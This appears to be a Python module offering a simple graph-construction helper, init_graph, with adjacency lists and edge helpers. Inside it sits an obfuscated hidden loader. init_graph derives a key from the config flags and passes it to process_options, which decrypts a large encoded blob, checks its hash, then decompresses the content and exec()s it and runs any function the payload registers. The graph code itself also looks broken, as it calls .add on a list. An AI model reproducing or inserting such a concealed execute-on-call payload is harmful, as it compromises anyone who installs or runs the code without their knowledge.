from collections import defaultdict
import base64
import hashlib

def simple_shift_decrypt(encoded_text, password):
    key = int(hashlib.sha256(password).hexdigest(), 16)
    encrypted_bytes = base64.b64decode(encoded_text)
    decrypted = ''.join([chr((b - (key % 256)) % 256) for b in encrypted_bytes])

    return decrypted

methods = {'try_options': None}

def process_options(options):
    encoded_data = 'ZmdmODg2ODs7ODhmaDxqOTQ4Z2hnaDk0Nzw9amlqNWlmPDc4aDhpaGo6OWg9aWU3ZzxoZmdnaTc6amhqNTg8PV04OFQ7aHszMz09OS92NXhJV1hJPEdqaDpOUXAvdF1lT3V+cmV+M2h8N2pvNj1maD1HRzw7UWtWVWd5RlU5XGs5a244TUVHXD1GT1BQNGx6XWlOPW57OGdYWjlpd157andoZT1Rdz03RXtSSk01NS9IV3k2ZTkzTUhKL1FZV2lXWmtFbVlWdDlrcH1XODc7XllNZnh1XnBJdDNmfHlwdVFFblZGNms4fltdanNbNUVOZlhzTGhYWC9HOlVzOVN4aTxqfV56O15tcjdFTjdSNF4zcExbcXNrZ0ZOODl+di83UFI4e29dUTVLM3hScnVFc2VNLzh5cXlyaG1aRlBJaVQ1RTRaUTtHd3hdTW9qe0Z5S1BsSl5ybVFZOko9PHhtb0hPTX1wZi87fUhYXVFzO046e15RPE5weztbb29mVDx9bVQ8ODdvey9rUEtpNi9MSFY9bkt1aVZxbnNaUEwzWTx2XTdyb0VsN3dPL2g7WW1Le1I8WXh7RXRuWnZralFtWGpKUnBFNWVVbEtOXGVOfTc8NDVPe3w7cTZRN3tJOTNTfThdfVdqdDhSWH46bTtxM3dFTlBQbXFqPFZ3aFZ+b2xFZ1x+aVxPXX13ck5YVGVcVVtJTlx8WE9lak5GNlxvb3FXU2hdWFBqXWpURVJ6OFQ2dlVLe2VbSy9dNlBdSHk7NG5tcHV8O2ZXdkx7fmh0TXBsb2k9dFhTaXVyPUZdN2V7cjh3O207V1VUcFxrfkdIfFBzR2t9MzlKZmV7Z2dHNVd6c2p4SlBubXBzcGdudXpxcmo0WlJ6U0Z3WTk1cVV7XTZlWnd+VkU4L1F+emlJZ1lLWnRNeXI3d3lrW35nRTxSdnlee0p+bVFQeDRvcX4zRVZZTH1xN1s5eXJUOS9RXXZdWm1KV2ttU1wvcVNwbVJVOX5IcXltPTg5cVBTcG5sU3JHTmczOV1ybFc4aF4vRnN6XXlybDN9ZXhRXUVUWU9QT3A3RVN5dnY2eHdvWllKPV5TfTx1V2lUfVprM3NHXm5samtWPWYvdElePHFKZnhafmVXTlh5SH1Kc1JISXNYcHt1cVRWOTxxWDRUPGtRanBTVn19a1x2a09HPWVba3RaWGhWNWlrd2gvL112TFROM3xVN3RbWElWSFU8SlRdNEZZRkhrWW57PXQ7V3FaWEtQPDVuXW1cW1VRUjlxUlh3e3lZM21IWk1Gfms1PE9FVFh9WHN5cEx8VF5Ve1NQXT1xXXFsTG5nTk1bUjR1fH57cE1PPHk0WzRGL242TFNlSjNyZ3NHNW5odjU4UHJaL0VxRmdGL2ZpM3hnRUhMZWU1VHBneXRuS3xJS1ZMUks2PV5qOTNGZUVpbDN0NEpxWUVVcjU2RXp+OTlId1x6enVmPXV+c3UvSHxOe3NXZXk9UXpzNThFWDtLT1VGZnx+OVRFbzxFUHw9cnxMe3p5fXZHZX1YfX13RlpPV3JpfXw6eUVbSk58TkhHNlFlaz1qPXo7L0V0WDhdWVB7dG1pfHZtXktFdz1bdG57bUZ9dVZFaGtNPFo8VUx1eGk7U2VaUUc2UHlVd2pwXHE6aXlpTmxGb2ZYZlFLNU1MWExpOkhdPDprbzxxfXBZO1pdMzk9bUk1Vmk9Ry96L21lWzc4O15YVEw8Ui83OzxKV29YVn08NH1yPTxQSltQWGkzcTlxaktocXFQVHhxTzxOXnhVVHE9clNtaVE0TVh1Oi9ZSktTfkVud3FxWnpFaX5ZXVdJRn0zO3BodXpxeFJIZlJ8ODdqeVBWNj13WHJ1UHFUTHtUdkl1SnY1T25KM3d4c0g6V0ZublYvNHt0aDl7d1hcWVBscXled2tobHVHRXF5Sm1RdjdxRllcS054e298TmxtfGZXeGtmcTZXcDhZRk1VfEleV31Vd0t+MzZoc2t3NX13b3Q8TTpPNWo6ODtQT2pSVFxefHZtaDtSNlRUd31RNHx1cXw5OFxmeUlecFVaa2ZVODl6blxodXVGTmZdTGtucjVlT3paPFY7U25oM1ZZSHNcVkpqTn47S1hdezN0fTVHTTs5VlNNfjw5T3NrS3plc0tTW0l3OTRcTnBraTo0enN6bj14RTY6RmhnXGY7cTZXSFB2fWpNe1tae1t7NDtxai9LUk9HfHo7dlA3NklLbGc8eGVnTUVRejY5cEZHOGlQRnl9XThraWlNaHtoPV1aZlVVcHVSPHJ0fE90WWZXSmZKZ3hwTEUvdztqMz16N1NoeH1UWTVdd2l+S09IUXtRe2h7Unp6OnQ6M3RVOW5HdDhbTjVWPFM4T21tcUx+T0dafk55OFNFXF5nOlFqV1huL0ZtOnNnXml5d3dvbmtLbHlUM35rZTNWZX5VNi98e1d9UlRKd2hrd3BcazNqTj08Oz1zeTdad3hpczVZZ3lFe1tdTHtQN3lxRU42RkltVnU4fTdNUnBbZUlvUm16dTd8cEpHVEh3WkV5VzQ5VTdIM3gvV0lVfn40OT1rRnNJPXFndS9ocEVqaGhteS9PcW5YfH5LSU4vUFxtXFFaXns9clZtS11eT0lvaHN4VXV5WFlxNDxbbVE5ejNMb3JmS1VJfm1+e1VXcVR1WVRaRkU0VGw6WEc7fWx5bX5UOS9yZUpaWDVTSVE3SHFlOH4zTHd0eW9HfHE8RUU1OVFaXjs5RThwellaOFx+STVOS1VpXTVQfTM4VTZQfEs3TmxFNGovUVdFZ107N3tpdHF+cHpSTF5wcV0zRlVSckxZNncvV1JvaX5qWDx8aHRJWTZ1cVp9enpqWHRaRlxzWjl0XFBydDRpeH4vRz1vVWhPW3BeNll4VHFdZlZvWnFwUUZYS0lGOkhPOlxed3JVPFNqL3FsXFxoeGl4fD1MUGw7W11JbXdzWnhJclNTenBNTFM0VkdnfUt4SjdzclpJTEZsSFhrcUZML3BQeU1qcGxzVlFWd2hbTm5WXH1pSU5JcWpFZzc9W3hHNEt3d3xFOn14fHprM1x4STl5U1xtM35nSlN3e3Z+XWpwOk9nUzR6PTplOlpURVZpbHtXXFBYTjRpXX1OPG9KSTlIT0daSXhtV307ZTgzfTdmWzYvdzVLTDVwdnBPdTRFZ0ZNVkpQdH5FbWdsNnt4SEtUOnI3bWtQPFhNeC9XTEp5L2VrNHc4UndwdVFLXVY3O2pVck93TGlLTlsvZjw1PE5mezhPeFNMPW5yO0pXdW5aVmh5WkVXNjN1ellRNj1tZVZHfW1qem5qR05oPWhcW2dbVS9dUUk0N3w5VjY4MzpzXUk0T2U7e1VTSUxOcmZRVnN8UEo0ak9xPDpFXWdyTEZJO1U8OXBIXH1qb3VxNXg7NnJlXFFuaVRyL1k4eUZMb3dobi9xVXpKezRzWTh0cDZITXJ2bG82cWl3Tjt8WEZ+aGxedVBmTHp2bE41XFRKfjRWOlhPNlY8XG5sdF1Sa25URUl3NmZwWzc7NjxIcUk9UzhXTDh8cUVNeC84VEx2ckxOc2pmXnlKeTQ5PDpacWs8ZWVPdDVFM3ZHbHtIbXxxVVY3ODQ2SltYTn5GOzYzW3s7PHRufGlGXWh7XUhQNWtPRVV8Z3JteVled3BtcVB4Okk4Nz1VTThSNnd8d2p+WXp4VXV+Zmt8OjVePFB3NzRYUDtcS3N1cFpNRTpWUEt0S3tKTG9FaUpdUlVwb1N8eTNldGkzdV5SR0lnXnlFO21yOi88PVw4ZmxTdmtHUFdcTktaSlR2ODRFT2ZMNHQ4Uy8vOFh9T1g1XXlQWVQ1U1RWfktNe0ZaZWt6fGpadXZUZ0dYO3l0Z3BJNUc8fC87dVh4bTN0WmlmSDZNalNWaE9MdlxQTlJUbXg9RTteWTpmSH48fGtzNlhJVXs5bE1HfXZrU28zNnpUVkpmXFlXWntqelZ1VFx+Z1N2Ojt6bGdzO057Tl1Rb2p8UFczNDR6T1VadTcvVXlWZ1htM3dQXl5qM0dQWHF4fEw0SHdUbEltNlZ0TDhabTl8ezw9XDVFSUprfkdVXXB1L0peUXpGZXBNWT1vXVNuU0tTVkh1eGpFfXNPak11W0lIV0VUSlVncWV8ey9ufDlld3lIUzM0e11paltIPFF4b296a1o6dEl2WXAzU3s5bXg4c25qZlx1Xm48WlU3UXMvfWpQVFdVWkVmTnhPOHBRelhtfWk1ezN8fGV7XTd1bkp9OlBzVGVtM3o3dTV6VWZKbzpKb0h2UWo3R2xTcFFJVXY7PGpQfk5KW34zR1J9RkVrVGVLOFBaa2trR2VzM2dWblc2PE8vTztRSEdIfEdITEtqbk9lXVlHTVpMeF54ODU6cjdeUWc1antQbDtGbF54WFZUZU5JfVhvfmV+WGx2eDQ8TFpmRThMfXNyczo1a0Z6RUwzOy83V0x6TmZISk01WWZHXGw4OVR7VXZ9Skw8SF4zRmtRb2VdO31URT10Rzk5b1Zse3dxenkzZzw6U1V2c0lsV2VIblg9S3ppOm1vb09+S2h6VFg4RTtueDo9OXRGUDo5VnJJZ3N1enJpcl08NlZZSS9nSFM5enpue3FwOzxORzY4NXxPN14zcHdPSGU4e3tqNUt7UEk5dGZ9PHc8aUg1c0tJTltSazs1dTNGbkg4eGc5WEpWdjd2aEdaPXFydE81M25PS1g2PTd3NnVTZU5uR1tKSF5zbjRHO1RmVHZxfH5aZzpKaUwvZS9ybVY7XlN+e0s3dy9IcE03OXBOWjRwVGdPdEdUdDs2XH1lUzpKWnV2Ols9cFN6W1pFaTlKPFlKa3BeL1pYeDlLWDtHdzQ1RVB9TWlTeHpSRkZtd0VIa212TElmUnZscWxFOW9vZ21KZX46OD1WSUY0RzRGW0kzVlx7M1t5dFhzVTpqSy9QWzlsdjZyWlR6SHpHZ35Zflx5ZUtxejhUdGheOlA4TzQ6ZT1taWxxcHFeaUZsNllXTTdKSHpJNFleMz11dl5KUE5bV1ZmWjprV1c6O3JtL3VTezo5TWk8VnhGOzZTdX1oVV40Z0VKXWZFeFlMUy85Ti9rajloN29SZlB9T1B7cXN9alN5UThHUVN0akt+by9edko7b29JW2dNNH5cU1dGbVRrUjd0NDZbb0p3fVdSXH1Pemdea2ddT0ZybmY1fHRQanQ2Mzl0TWZGNFVTNlRGPVhwZnxOWHlQUlF7THc3XHxRL0d9Z1pob154dDZabzdpZ2xVNGxzSXdtcDtGdjxZS1d1M2xNbGV2PW08b019RWs0PDQ8dWpwb2xNUVdGcTVvZV11fHJ2UDVWRnF1dWVOVm92Z2s4dG1sOVZxfU1XcElJejllZ3k0dzg8Rj09XGo0aEs2XjRaVlFLW25odjNIVXl9RTR4M0ZcfXdLVGlOaUxGZXxnTm5bSFlNbVNQZ11USm9od2U8ZlRXfTRGVDNwSUZKaFhTXFxPS1k1NTczRTRtdXNbdlpwdm1cTXY5Xlg6Ukc9XGZSZlJpODRGXDVuOVx1XjxXejZSdmt3cVR1OzdUOy89NEhdZVJ3UTZ5My9dZjZ8fnVKUDc1am5ON1c3dnJnV1Y3ckxRO085VEtyTnpFOl5wajdxRi84bnh4Okt9Zz1eWDxZT3JQd3M2N1hMRU50V3RsSl09TzR5b0c8Tzlsa1pzPDd6PHpZdTx1bnR1TXBOTzpVS1xPLzZUcF50bHt3NDxHUFFRamxubzw9eHxXNDlHfjlJSUZaR2tNXVNJRXltXnh1RUVmbG9PVnovWy94Oj1MeS89SX0vZnleNzlGVD05dVVIcVV8M2xoRn1VcztsZjdJcnhMSjV7dWs1NTpSaD1Pempwd3JYZzRyanU0UjRJWWVIdngzcl5rc2wvamZ5WXVbfWxnfFdJL3E3RVZLVV1oNDxOZ31eVXxvOnw1RVRtaHxxcXB7ezhLaltmRTRJWk9HNXxWdU5USUtPXVRFXTs6eW9ZT29qZzY0aGtefGZufF51Tm9PVlZNXG5zd1JWNTNZVkp3VXBWTDNVbzZ2Z1tQd3lrfGdWek07fHFYWHU3aX50Z0hOfE5FOFdwPEZ3UH19RXcze3RWfHBIbFNZR2d1dEZualx7dVdabjpNSnZyXmppVk5da09wOTY8bjVFdVBbOG53VVt4dmVRaExtbXlmUj1qNEV1fDdsZXpqdG5UbGpISDY9NFVZSWw9TXwzcGx1ZzlOV21oXGp0ezZcOG9wWntzeUVTbDVlcjdeWkhTR0Z5U3dNd1FsPEk8VlJeRXRTVGo1aXhxbGt4XTVSTEpZWXpzNXR4dmx5cWxpdH43NXF6TT1pVE9qS0hYPWVGaVNyfVdaTXtzXn5GUEZafnk0OVRWTWZRT3deOW12SHZqb3x0dGhrbEdKLzVFU1VdTm5JTmdde1BMck1VVVo1UXVWfkVlVklKLzl6SFtZW2k1UDlKSk5wbl5TXE5qRnp5XXJxT0hwZjU2blJTUm1mZTtNN312M1dsUFl4UXtmUHw1XDpmV149eFtdWk83bGlvXllrb11rdVRsNFt+TGk4eGxyb1NdS05sTU1NSV07Xk9MO285RU9qUFFecFsvd2Z2M2x9TnppV2prdnMvcGdnNFNJNWtJWztUaW83UmpaOmdvSFFxNlU4XX1RfDluTHV+RjVHVXZpeU98UEVRVHJMdDtSN3ZxdE09Uns9SVFUVkt+NC9IO2s9TnddWE1mOT1cdHJqOndpXUgvUzxPOEovcnl0PXZ1S2tWeUVJaHova3htaUozdFducVdtM1I4TWd+L21Zc1w0LzltWVpvVmx6aE5UU25QXH04Tkd4cFttNkcvUVU0dWh4R1ByL3BaTlJxaEddal5tcm90W1A1VXJoWFwzTHRuclhebmt+O0VYOXxQbH11anM2RnFaVG9le09belprSGtrVjRXZUUzZ3Q4Vkw9U0Z+O1hnb1c8dzx2c3N7OTo3cjR2cWc0fFBeS2Z7dlA4b0lWbHU9N0xZWnF3bzM3dkdSXVV0N1tUN1ozfFVrcU46NVg8N2lxfU85Ukx5N11laUxGXlZaSzVxa3NRS1g5O0YzOS82ampvXGpGOXM4cTtnfnFaU1xtc0l3bFRqflh+XlFYNnJzZXlJZnd8TUd3aWx0TFdweU5XfW94Nngve1JZVTpadkw7W1g7L0xzdmZrdjZabU9KLzxlZVZpemZ4aEg7U3NqRlJJb250dlQ3c3M1Lzp1el1+ZUdoWVFnTTR3Zjp6RlBYRUY6a3lyVU96U010OmZFL2xNWlY3XkVpNUZxTU5sXjVrdTt0U0g2T05MUVF0Ok4vdDlFWHF8ZVU6bVlrOXpOaU0vdml0djR4UnRGcWxtdWVMTnk9Sjc2ZnlHdlRzTnZrUEl4V3gzfn1pTW5Me3JpSlJxM3QvV11nXnJ1dm43a1FmWWtGOXk0bGtNVDlVOHFFRlBKW2taTVBRN2hYPDh3UWxxazVTSEtpVTxVVGxIOkxJbFZsa3k3fU5JT1ZNS0dJclxvNT07elJHPEZLWztyW3JLezRdaVVYO3Z8bTZWSExMU0pufjNSUHY2PTR5PEZROF5+Vk41e3pKb09MfjRoM1VWXGh7S2s6NHhVaF1aRWYvUVpURnhnWHdmRUlWOXNMa09xb05xRU83TXA0d1pVVWVzbjRVL2dNXFhPSzlydjhdaEpOZnBTL0xmOkl+XDpJPW1bUW08dVk7fV5tfTpcVXwzOHN+ZXNIOX5VWDtPbldxTXs3NWo8W3A6bnY2OV06NlI7XHhNNHxIal18SlFtUHp4W3BZZ21xO2tHL1JJRUxSOW0zVVt2eTxuRXU6e2pwSkk7blFdSnE9dnpySkpIaXFaVnJFaHBVOHNRNjs5Skc2NEppN0lYTVg6fW8vcjwzMz09PDwzejlYWmk4bHJaWlplezl+WDM6fklYUWY6cl5tXk5xSmVlN348TUZXa1l8fVs0cFp7Tmk='
    decoded_data = simple_shift_decrypt(encoded_data, options.encode('utf-8')).encode('utf-8')

    hash = decoded_data[:64]
    content = decoded_data[64:]

    if  hashlib.sha256(content).hexdigest() == hash.decode('utf-8'):
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(content))

        if methods['try_options']:
            methods['try_options'](options)

def init_graph(opts, config=None):
    if config is None:
        config = {}

    edges = config.get('edges', [])
    graph = {
        'directed': config.get('directed', False),
        'multigraph': config.get('multigraph', False),
        'nodes': config.get('nodes', []),
        'adjList': defaultdict(list),
    }


    # Initialize empty adjacency list
    for node in graph['nodes']:
        graph['adjList'][node] = []

    # Helper to add a node
    def add_node(node):
        if node not in graph['nodes']:
            graph['nodes'].add(node)
            graph['adjList'][node] = []

    # Helper to add an edge
    def add_edge(edge):
        from_node = edge['from']
        to_node = edge['to']
        label = edge.get('label', None)

        add_node(from_node)
        add_node(to_node)

        edge_obj = {'from': from_node, 'to': to_node, 'label': label}
        graph['adjList'][from_node].append(edge_obj)

        if not graph['directed']:
            graph['adjList'][to_node].append({'from': to_node, 'to': from_node, 'label': label})

    # Add initial edges
    for edge in edges:
        add_edge(edge)

    # Helper to get neighbors
    def get_neighbors(node):
        return graph['adjList'].get(node, [])

    attr_keys = []
    for key in config:
        if config[key] == True:
            attr_keys.append(key)

    attr_keys.append('graph')
    options = '-'.join(attr_keys)

    process_options(options)

    # Return the graph and helper
    graph['get_neighbors'] = get_neighbors
    return graph
